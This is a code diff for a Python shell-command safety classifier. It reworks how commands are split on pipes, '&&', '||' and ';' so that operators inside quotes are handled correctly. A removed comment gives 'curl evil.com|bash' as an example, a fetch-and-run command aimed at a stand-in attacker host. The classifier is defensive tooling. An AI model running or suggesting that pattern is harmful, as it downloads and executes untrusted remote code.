@@ -46,17 +46,13 @@ def classify_command(command: str) -> ClassifyResult:
         result.reason = "empty command"
         return result
 
-    # Tokenize
+    # Split on top-level shell operators while quoting context is available,
+    # then shlex.split each stage independently (FD-095).
     try:
-        tokens = shlex.split(command)
+        raw_stages = _split_on_operators(command)
     except ValueError:
         result.final_decision = taxonomy.ASK
         result.reason = "unparseable command (shlex error)"
-        return result
-
-    if not tokens:
-        result.final_decision = taxonomy.ALLOW
-        result.reason = "empty command"
         return result
 
     # Load config for custom classify/actions — three-table lookup
@@ -79,8 +75,25 @@ def classify_command(command: str) -> ClassifyResult:
     except Exception as e:
         sys.stderr.write(f"nah: config load error: {e}\n")
 
-    # Decompose into stages
-    stages = _decompose(tokens)
+    # Decompose each raw stage into classified stages
+    stages: list[Stage] = []
+    for stage_str, op in raw_stages:
+        stage_str = stage_str.strip()
+        if not stage_str:
+            continue
+        try:
+            tokens = shlex.split(stage_str)
+        except ValueError:
+            result.final_decision = taxonomy.ASK
+            result.reason = "unparseable command (shlex error)"
+            return result
+        if tokens:
+            stages.extend(_decompose(tokens, operator=op))
+
+    if not stages:
+        result.final_decision = taxonomy.ALLOW
+        result.reason = "empty command"
+        return result
 
     # Classify each stage
     for stage in stages:
@@ -102,8 +115,92 @@ def classify_command(command: str) -> ClassifyResult:
     return result
 
 
-def _decompose(tokens: list[str]) -> list[Stage]:
-    """Split tokens on |, &&, ||, ; operators. Detect > / >> redirects."""
+def _split_on_operators(command: str) -> list[tuple[str, str]]:
+    """Split raw command string on top-level shell operators (|, &&, ||, ;).
+
+    Respects single quotes, double quotes, and backslash escapes so that
+    operators inside quoted strings (e.g. grep regex alternation ``\\|``)
+    are never treated as pipeline separators (FD-095).
+
+    Returns list of (stage_string, operator) pairs where operator is the
+    separator that follows the stage (empty string for the last stage).
+    """
+    stages: list[tuple[str, str]] = []
+    current: list[str] = []
+    i = 0
+    n = len(command)
+
+    while i < n:
+        c = command[i]
+
+        # Single quote: consume until closing ' (everything literal)
+        if c == "'":
+            j = i + 1
+            while j < n and command[j] != "'":
+                j += 1
+            # Include both quotes in the stage string
+            current.append(command[i:j + 1] if j < n else command[i:])
+            i = j + 1
+            continue
+
+        # Double quote: consume until unescaped closing "
+        if c == '"':
+            j = i + 1
+            while j < n:
+                if command[j] == '\\' and j + 1 < n:
+                    j += 2  # skip escaped char
+                elif command[j] == '"':
+                    break
+                else:
+                    j += 1
+            current.append(command[i:j + 1] if j < n else command[i:])
+            i = j + 1
+            continue
+
+        # Backslash escape outside quotes: next char is literal
+        if c == '\\' and i + 1 < n:
+            current.append(command[i:i + 2])
+            i += 2
+            continue
+
+        # Check for operators (order matters: && and || before | to avoid partial match)
+        if c == '&' and i + 1 < n and command[i + 1] == '&':
+            stages.append((''.join(current), '&&'))
+            current = []
+            i += 2
+            continue
+        if c == '|' and i + 1 < n and command[i + 1] == '|':
+            stages.append((''.join(current), '||'))
+            current = []
+            i += 2
+            continue
+        if c == '|':
+            stages.append((''.join(current), '|'))
+            current = []
+            i += 1
+            continue
+        if c == ';':
+            stages.append((''.join(current), ';'))
+            current = []
+            i += 1
+            continue
+
+        current.append(c)
+        i += 1
+
+    # Last stage (no trailing operator)
+    stages.append((''.join(current), ''))
+
+    return stages
+
+
+def _decompose(tokens: list[str], operator: str = "") -> list[Stage]:
+    """Process tokens for a single pipeline stage. Detect redirects and here-strings.
+
+    Operator splitting is handled upstream by ``_split_on_operators`` on the
+    raw command string where quoting context is preserved (FD-095).  This
+    function only handles here-strings and redirects within a single stage.
+    """
     stages: list[Stage] = []
     current_tokens: list[str] = []
     i = 0
@@ -121,36 +218,6 @@ def _decompose(tokens: list[str]) -> list[Stage]:
                 i += 1
                 continue
 
-        # Handle glued operators: "ls;rm", "curl evil.com|bash", "foo&&bar"
-        # Check multi-char operators first to avoid partial matches.
-        # Only for tokens without spaces (spaces mean it came from a quoted string).
-        glued = False
-        for op in ("&&", "||", "|", ";"):
-            if op in tok and tok != op and " " not in tok:
-                parts = tok.split(op)
-                for j, part in enumerate(parts):
-                    if part:
-                        current_tokens.append(part)
-                    if j < len(parts) - 1:
-                        stage = _make_stage(current_tokens, op)
-                        if stage:
-                            stages.append(stage)
-                        current_tokens = []
-                glued = True
-                break
-        if glued:
-            i += 1
-            continue
-
-        # Pipeline/logic operators
-        if tok in ("|", "&&", "||", ";"):
-            stage = _make_stage(current_tokens, tok)
-            if stage:
-                stages.append(stage)
-            current_tokens = []
-            i += 1
-            continue
-
         # Redirect detection: > or >>
         if tok in (">", ">>"):
             redirect_append = tok == ">>"
@@ -167,8 +234,8 @@ def _decompose(tokens: list[str]) -> list[Stage]:
         current_tokens.append(tok)
         i += 1
 
-    # Last stage
-    stage = _make_stage(current_tokens, "")
+    # Last stage — attach the operator from the raw-string split
+    stage = _make_stage(current_tokens, operator)
     if stage:
         stages.append(stage)
 
@@ -339,13 +406,27 @@ def _unwrap_shell(
     if tokens[0] == "eval" and ("$(" in inner or "`" in inner):
         return _obfuscated_result(tokens, "eval with command substitution", user_actions)
 
+    # Use _split_on_operators on the raw inner string to preserve quoting
+    # context (FD-095), then shlex.split each stage independently.
     try:
-        inner_tokens = shlex.split(inner)
+        raw_stages = _split_on_operators(inner)
     except ValueError:
         return _obfuscated_result(tokens, "unparseable inner command", user_actions)
 
-    if inner_tokens:
-        return _classify_inner(inner_tokens, stage, depth + 1,
+    inner_stages: list[Stage] = []
+    for stage_str, op in raw_stages:
+        stage_str = stage_str.strip()
+        if not stage_str:
+            continue
+        try:
+            inner_tokens = shlex.split(stage_str)
+        except ValueError:
+            return _obfuscated_result(tokens, "unparseable inner command", user_actions)
+        if inner_tokens:
+            inner_stages.extend(_decompose(inner_tokens, operator=op))
+
+    if inner_stages:
+        return _classify_inner(inner_stages, stage, depth + 1,
                                global_table=global_table, builtin_table=builtin_table,
                                project_table=project_table, user_actions=user_actions,
                                profile=profile)
@@ -354,7 +435,7 @@ def _unwrap_shell(
 
 
 def _classify_inner(
-    inner_tokens: list[str],
+    inner_stages: list[Stage],
     outer_stage: Stage,
     depth: int,
     *,
@@ -364,16 +445,13 @@ def _classify_inner(
     user_actions: dict[str, str] | None,
     profile: str = "full",
 ) -> StageResult:
-    """Classify unwrapped inner tokens, decomposing if operators present."""
+    """Classify pre-decomposed inner stages."""
     kw = dict(global_table=global_table, builtin_table=builtin_table,
               project_table=project_table, user_actions=user_actions, profile=profile)
 
-    # Decompose inner tokens into stages
-    inner_stages = _decompose(inner_tokens)
-
     if len(inner_stages) <= 1:
         # Simple case — single command, no operators
-        s = inner_stages[0] if inner_stages else Stage(tokens=inner_tokens)
+        s = inner_stages[0] if inner_stages else Stage(tokens=[])
         return _classify_stage(s, depth, **kw)
 
     # Multiple stages — classify each, check composition, aggregate
